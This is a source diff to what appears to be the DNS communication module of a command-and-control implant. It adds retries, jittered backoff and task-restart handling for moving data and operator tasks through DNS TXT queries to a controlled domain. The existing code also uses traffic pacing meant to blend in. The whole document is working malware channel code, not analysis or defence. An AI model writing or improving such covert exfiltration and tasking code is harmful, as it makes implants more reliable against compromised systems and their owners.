@@ -456,7 +456,21 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
             BYTE tmp[512];
             ULONG tmpSize = 0;
-            DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+            
+            // PUT with retry: DNS is unreliable, retry up to 3 times on failure
+            BOOL putOk = FALSE;
+            for (int retry = 0; retry < 3 && !putOk; retry++) {
+                if (retry > 0) {
+                    DnsDebugLogf("[DNS] PUT: retry %d for offset=%lu", retry, offset);
+                    ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
+                }
+                putOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+            }
+            
+            if (!putOk) {
+                DnsDebugLogf("[DNS] PUT: FAILED after 3 retries for offset=%lu - aborting upload", offset);
+                return;  // Abort upload, will retry entire upload next time
+            }
 
             // Pacing with Jitter (Traffic Shaping):
             // Range: 30-50ms (~20-30 packets/sec).
@@ -620,8 +634,18 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         BYTE binBuf[1024];
         int binLen = DnsBase64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
         if (binLen <= 0) {
-            DnsDebugLog("[DNS] GET: Base64 decode failed");
-            return; // Invalid or empty payload
+            DnsDebugLog("[DNS] GET: Base64 decode failed or empty response");
+            // Server may have restarted and lost task state
+            // Abort current download so next heartbeat can re-check for tasks
+            if (this->downBuf) {
+                DnsDebugLog("[DNS] GET: Aborting incomplete download due to empty response");
+                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                this->downBuf = NULL;
+                this->downTotal = 0;
+                this->downFilled = 0;
+                this->downAckOffset = 0;
+            }
+            return;
         }
 
         const ULONG headerSize = 8;
@@ -650,7 +674,11 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 
                 // Initialize buffer if needed (starting a NEW task)
                 if (!this->downBuf || this->downTotal != total) {
+                    // CRITICAL: If total changed, this is a NEW task from server restart
+                    // We must discard current chunk and restart from offset=0
                     if (this->downBuf && this->downTotal) {
+                        DnsDebugLogf("[DNS] GET: TASK CHANGED! old_total=%lu new_total=%lu - restarting download", 
+                                     this->downTotal, total);
                         MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                     }
                     this->downBuf = (BYTE*)MemAllocLocal(total);
@@ -663,6 +691,12 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                     this->downFilled = 0;
                     this->downAckOffset = 0; // Reset ACK offset for NEW task
                     DnsDebugLogf("[DNS] GET: starting new task, total=%lu bytes", total);
+                    
+                    // If current chunk offset != 0, discard it and request from 0 next time
+                    if (offset != 0) {
+                        DnsDebugLogf("[DNS] GET: received offset=%lu but need offset=0 - discarding, will retry", offset);
+                        return; // Next SendData() will request offset=0
+                    }
                 }
 
                 // Copy chunk at the correct offset
